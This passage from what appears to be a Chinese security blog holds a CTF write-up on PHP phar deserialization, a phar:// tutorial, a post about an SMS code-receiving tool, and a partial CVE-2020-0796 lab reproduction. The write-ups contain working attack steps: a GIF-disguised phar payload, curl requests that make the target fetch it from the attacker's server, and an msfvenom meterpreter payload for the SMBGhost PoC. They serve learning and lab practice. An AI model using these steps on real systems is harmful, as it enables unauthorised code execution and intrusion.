class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 检查文件头是否为GIF89a，不等于GIF89a 返回fuck off</span></span><br><span class="line">    $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data); <span class="comment">//把一个$data写入（路径）/avatar.gif文件中</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 查看/avatar.gif</span></span><br><span class="line">    <span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123; <span class="comment">//查文件或目录是否存在</span></span><br><span class="line">        $path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>); <span class="comment">//gif图片格式 </span></span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>)); <span class="comment">//将文件内容读入输出并退出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">    upload(check_session()); <span class="comment">//从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">    show(check_session()); <span class="comment">//从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); <span class="comment">//对取得当前文件的绝对地址文件进行语法高亮显示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路解析"><a href="#思路解析" class="headerlink" title="思路解析"></a>思路解析</h4><p>首先分析代码, 首先定义了一个getFlag函数, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个函数</p>
<p>题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif</p>
<h5 id="初步想法"><a href="#初步想法" class="headerlink" title="初步想法"></a>初步想法</h5><p>admin是关键类,利用通过反序列化之后的析构函数去通过lucky参数去调用Getflag函数输出flag，而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 无法绕过判断机制，基本上不可能伪造的了。</p>
<h5 id="本题考点"><a href="#本题考点" class="headerlink" title="本题考点"></a>本题考点</h5><p>php中解析Phar归档中的Metadata的时候会有反序列化的操作</p>
<p><a href="https://www.php.net/manual/zh/phar.getmetadata.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/phar.getmetadata.php</a></p>
<p><a href="https://scriptkid-beta.github.io/2020/06/09/Phar/">Phar://</a></p>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><p>生成phar的gif头格式文件，并修改后缀名为gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"avatar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> Admin();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并将生成的gif图放到自己的http服务器中(这里本地python临时起的服务)</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png" alt="image-20200611132224047"></p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">http://www.xxxx.com/<span class="meta">index</span>.php?m=upload<span class="variable">&amp;url</span>=http://10.255.252.192:8000</span><br><span class="line"></span><br><span class="line">http://www.xxxx.com/<span class="meta">index</span>.php?m=upload<span class="variable">&amp;url</span>=phar:///var/www/data/Y3RmMTAuMjU1LjI1Mi4xOTI=<span class="variable">&amp;lucky</span>=getFlag</span><br><span class="line">注:这里的base64编码（Y3RmMTAuMjU1LjI1Mi4xOTI=）是由(ctf加ip地址)进行base64编码得到的</span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609084749799.png" alt=""></p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085038212.png" alt="image-20200609085038212"></p>
<h5 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h5><p>生成phar的gif头格式文件，并修改后缀名为gif</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">"avatar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span></span><br><span class="line"><span class="php">    $o = <span class="keyword">new</span> Admin();</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>并将生成的gif图放到自己的http服务器中(这里本地python临时起的服务)</p>
<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png" alt="image-20200611132224047"></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">curl --cookie-<span class="keyword">jar </span>idlefire <span class="string">"http://www.xxxx.com/index.php"</span></span><br><span class="line"></span><br><span class="line">curl -<span class="keyword">b </span>idlefire <span class="string">"http://www.xxxx.com/index.php?m=upload&amp;url=http://10.255.252.192:8000/"</span></span><br><span class="line"></span><br><span class="line">curl -<span class="keyword">b </span>idlefire <span class="string">"http://www.xxxx.com/index.php?m=upload&amp;url=phar:///var/www/data/Y3RmMTAuMjU1LjI1Mi4xOTI=&amp;lucky=getFlag"</span></span><br><span class="line"></span><br><span class="line">注:这里的<span class="keyword">base64编码（Y3RmMTAuMjU1LjI1Mi4xOTI=）是由(ctf加ip地址)进行base64编码得到的</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085312907.png" alt="image-20200609085312907"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><p>这题根据经典题目（<a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/baby^h-master-php-2017" target="_blank" rel="noopener">hitcon-ctf-2017baby^h-master-php-2017</a>）进行的改编，在某种程度上进行降低了难度。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a></p>
<p><a href="https://www.bilibili.com/read/cv6347230/" target="_blank" rel="noopener">https://www.bilibili.com/read/cv6347230/</a></p>
<p><a href="https://xz.aliyun.com/t/1773/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1773/</a></p>
<p><a href="https://www.cnblogs.com/jxkshu/p/4997219.html" target="_blank" rel="noopener">https://www.cnblogs.com/jxkshu/p/4997219.html</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>phar://</title>
    <url>/2020/06/09/Phar/</url>
    <content><![CDATA[<h4 id="php支持的协议和封装协议"><a href="#php支持的协议和封装协议" class="headerlink" title="php支持的协议和封装协议"></a>php支持的协议和封装协议</h4><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">//</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<h4 id="Phar是什么？"><a href="#Phar是什么？" class="headerlink" title="Phar是什么？"></a>Phar是什么？</h4><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，可以方便地将多个文件组合成一个文件。在PHP 5.3 或更高版本中默认支持，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。</p>
<a id="more"></a>

<h4 id="phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比"><a href="#phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比" class="headerlink" title="phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比"></a>phar扩展中三种受支持的文件格式（Phar、Tar、Zip）对比</h4><p><img src="/img/Phar/image-20200610092038319.png" alt="image-20200610092038319"></p>
<p>这里主要概述Phar</p>
<h4 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h4><p>All Phar archives contain three to four sections:</p>
<ol>
<li>a stub</li>
<li>a manifest describing the contents</li>
<li>the file contents</li>
<li>[optional] a signature for verifying Phar integrity (phar file format only)</li>
</ol>
<h5 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h5><p>最小的stub如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span></span><br></pre></td></tr></table></figure>

<p>stub要以<em>__HALT_COMPILER（）</em>结尾的要求外，没有任何限制<em>。</em>否则phar扩展名将无法处理Phar。</p>
<h5 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h5><p>Phar清单是一种高度优化的格式，允许按文件指定文件压缩，文件权限，甚至是用户定义的元数据（例如文件用户或组）。</p>
<p>其中Meta-data部分的信息会以反序列化的形式储存，这里就是<strong>漏洞利用的关键点</strong></p>
<p><img src="/img/Phar/image-20200610090122258.png" alt="image-20200610090122258"></p>
<h5 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h5><p>压缩文件的内容</p>
<h5 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h5><p>包含签名的Phar总是在加载器，清单和文件内容之后，将签名附加到Phar归档文件的末尾。 目前支持的两种签名格式是MD5和SHA1。</p>
<p>签名格式:</p>
<p><img src="/img/Phar/image-20200610091746077.png" alt="image-20200610091746077"></p>
<h4 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过以下代码创建一个phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $name=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果出现如下的异常提示，将php.ini中的phar.readonly修改为Off</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">Fatal <span class="keyword">error</span>: Uncaught UnexpectedValueException: creating archive <span class="string">"test.phar"</span> disabled <span class="keyword">by</span> the php.ini setting phar.<span class="keyword">readonly</span> <span class="keyword">in</span>...</span><br></pre></td></tr></table></figure>

<p><img src="/img/Phar/image-20200610130230606.png" alt=""></p>
<p>生成得phar文件，并将以十六进制的形式进行查看，一部分序列化的内容就是上述说的Meta-Data</p>
<p><img src="/img/Phar/image-20200610131216585.png" alt=""></p>
<h5 id="生成其他格式文件的Phar文件"><a href="#生成其他格式文件的Phar文件" class="headerlink" title="生成其他格式文件的Phar文件"></a>生成其他格式文件的Phar文件</h5><p>因为phar文件php是通过其文件头的stub来识别的，更确切点来说是<code>__HALT_COMPILER();</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头信息+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过以下代码创建一个其他格式的phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $name=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"gif.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Phar/image-20200610160634614.png" alt="image-20200610160634614"></p>
<h4 id="phar实现反序列化"><a href="#phar实现反序列化" class="headerlink" title="phar实现反序列化"></a>phar实现反序列化</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">phar.c#L618</a>其调用了<code>php_var_unserialize</code></p>
<p><img src="/img/Phar/image-20200611102749956.png" alt="image-20200611102749956"></p>
<p>通俗点讲：使用phra://伪协议读取文件的时候，文件会被解析成phar对象，这个时候，刚才那部分的序列化的信息就会触发反序列化。因此可以构造一个特殊的phar包，使得攻击代码能够被反序列化。</p>
<h5 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h5><p>生成GIF格式文件的Phar文件，并将后缀名更改为gif</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过以下代码创建一个其他格式的phar文件</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $name=<span class="string">"test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"gif.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Test代码：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class<span class="built_in"> User </span>&#123;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">"Test run"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">include(<span class="string">'phar://gif.gif'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>成功反序列化识别文件内容，采用这种方法可以绕过很大一部分上传检测。</p>
<p>这里可以看到已经反序列化成功触发<code>__destruct</code>方法并且读取了文件内容。</p>
<p><img src="/img/Phar/image-20200610170419400.png" alt="image-20200610170419400"></p>
<p>利用phar函数可以在不适用unserialize()函数的情况下触发PHP反序列化漏洞 。</p>
<p>漏洞点在使用phar://协议读取文件时，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="可触发反序列化的操作函数"><a href="#可触发反序列化的操作函数" class="headerlink" title="可触发反序列化的操作函数"></a>可触发反序列化的操作函数</h5><table>
<thead>
<tr>
<th>可触发反序列化的操作函数</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
<h5 id="可触发条件"><a href="#可触发条件" class="headerlink" title="可触发条件"></a>可触发条件</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、可以上传Phar文件到服务端（不支持远程调用）</span><br><span class="line"><span class="number">2</span>、有可以利用的魔术方法</span><br><span class="line"><span class="number">3</span>、文件操作函数的参数可控</span><br><span class="line"><span class="number">4</span>、无过滤: / phar等特殊字符没有被过滤</span><br><span class="line">提示：</span><br><span class="line">如果有限制不可以phar:<span class="comment">//出现在头几个字符，可以使用Bzip / Gzip协议绕过</span></span><br><span class="line">Postgres、MySQL也可触发phar造成反序列化</span><br></pre></td></tr></table></figure>

<h5 id="CTF案例一"><a href="#CTF案例一" class="headerlink" title="CTF案例一"></a>CTF案例一</h5><p><a href="https://scriptkid-beta.github.io/2020/06/12/记一次CTF拉练/#more">记一次CTF拉练</a></p>
<h5 id="CTF案例二"><a href="#CTF案例二" class="headerlink" title="CTF案例二"></a>CTF案例二</h5><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202" target="_blank" rel="noopener">SUCTF2019-Upload labs 2</a></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p>
<p><a href="https://www.php.net/manual/zh/book.phar.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.phar.php</a></p>
<p><a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/#0x01-起源" target="_blank" rel="noopener">http://www.lmxspace.com</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/#0X05-利用-phar-拓展-PHP-反序列化的攻击面" target="_blank" rel="noopener">https://www.k0rz3n.com/</a></p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>短信接码工具V1.0</title>
    <url>/2020/06/05/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>因平时需要用到短信接码平台来接收一下短信验证码，每次用的时候都要搜索找然后这点那点的感觉很麻烦，然后最近划水居多就拉着小伙伴（@trepverter）一起捣鼓，所以有了这一款短信接码工具V1.0</p>
<a id="more"></a>

<h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><p>短信接码工具使用了跨平台兼容能力较好的JAVA语言进行编写，并采用以下接码平台网站做为数据来源，进行提取相关数据并展示在界面中。</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">接码平台</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.becmd.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.z-sms.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.shejiinn.com/</span></span><br></pre></td></tr></table></figure>

<h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><p>无</p>
<h4 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>SMS_Code_Gui</span><br></pre></td></tr></table></figure>

<h4 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h4><p><img src="/img/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/image-20200605135036363.png" alt="image-20200605135036363"></p>
<p><img src="/img/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/image-20200605143827901.png" alt="image-20200605143827901"></p>
<p><img src="/img/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/image-20200605140856053.png" alt="image-20200605140856053"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><ul>
<li><p>此程序仅是闲暇时开发学习，结构及代码结构不够严谨，功能可能存在bug，请多多谅解。</p>
</li>
<li><p>整体功能基本实现，希望对你有用。最后感谢一起开发的小伙伴（@trepverter）。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796漏洞复现</title>
    <url>/2020/06/05/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
<h4 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Windows Server, version <span class="number">1909</span> (Server Core installation)</span><br><span class="line">Windows Server, version <span class="number">1903</span> (Server Core installation)</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> <span class="number">32</span>-bit Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> ARM64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> <span class="number">32</span>-bit Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> ARM64-based Systems</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">版本：Kali <span class="number">2020.2</span></span><br><span class="line">Python版本：Python <span class="number">3.8</span><span class="number">.2</span></span><br><span class="line">IP地址：<span class="number">192.168</span><span class="number">.174</span><span class="number">.136</span></span><br><span class="line"></span><br><span class="line">目标靶机：</span><br><span class="line">镜像：cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso</span><br><span class="line">版本：Windows <span class="number">10</span> 专业版</span><br><span class="line">版本号：<span class="number">1903</span></span><br><span class="line">OS版本：<span class="number">10.0</span><span class="number">.18362</span> 暂缺 Build <span class="number">18362</span></span><br><span class="line">RAM：<span class="number">2</span>GB</span><br><span class="line">防火墙状态：关闭</span><br><span class="line">IP地址：<span class="number">192.168</span><span class="number">.174</span><span class="number">.135</span></span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h5><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POC下载</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/chompie1337/SMBGhost_RCE_PoC</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110127820.png" alt="image-20200605110127820"></p>
<p>生成反向连接木马</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="title">msfvenom</span> -p windows/x64/meterpreter/bind_tcp l<span class="keyword">port</span>=6666 -f py -o link.py</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605105937620.png" alt="image-20200605105937620"></p>
<p>将生成的py文件中的变量”buf”替换为”USER_PAYLOAD”</p>
<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110624030.png" alt="image-20200605110624030"></p>
<p>替换变量名完成后并将其所有代码与SMBGhost_RCE_PoC中的exploit.py的中的部分相似内容（如图）进行覆盖替换</p>
